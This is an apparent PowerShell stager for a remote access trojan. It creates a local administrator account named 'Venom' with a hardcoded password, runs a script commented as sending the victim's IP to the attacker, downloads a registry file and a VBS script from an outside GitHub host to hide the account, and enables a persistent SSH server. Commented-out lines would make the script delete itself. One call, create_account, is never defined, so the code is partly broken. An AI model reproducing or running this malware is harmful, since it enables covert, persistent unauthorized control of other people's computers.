# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

#create admin for rat
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupmember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end {
    }
}
$NewLocalAdmin = "Venom"
$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


# create admin user
$uname = "Venom"
$pword = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# send ip to attacker
./smtp.ps1

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"

# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty

# hide venom user


# self delete
# cd $initial_dir
# del installer.ps1

